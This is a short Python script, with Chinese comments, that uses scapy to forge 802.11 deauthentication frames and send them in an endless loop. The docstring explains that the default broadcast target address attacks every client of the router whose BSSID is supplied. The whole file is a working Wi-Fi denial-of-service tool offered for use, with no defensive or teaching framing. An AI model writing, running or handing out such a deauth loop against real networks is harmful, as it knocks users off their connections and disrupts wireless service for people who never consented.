import time
from  scapy.all import *
from scapy.layers.all import *
from scapy.layers.dot11 import *
from scapy.layers.l2 import *




def deauth(src,interface = "wlan1mon",target_mac="FF:FF:FF:FF:FF:FF",reason=3,inter=0.01,count=10):
    """

    :param interface: liunx下使用iwconfig查看
    :param target_mac: 攻击的mac地址，默认为"FF:FF:FF:FF:FF:FF"，即广播，攻击全部
    :param src : 路由器mac地址，又称bssid
    :param reason 掉线原因
    :param inter=inter,count=count 为发包间隔和频率
    :return:
    """
    pk = RadioTap()/Dot11(subtype=0xc,addr1=target_mac,addr2=src,addr3=src)/Dot11Deauth(reason=reason)
    while 1:
        sendp(pk,iface=interface,inter=inter,count=count)

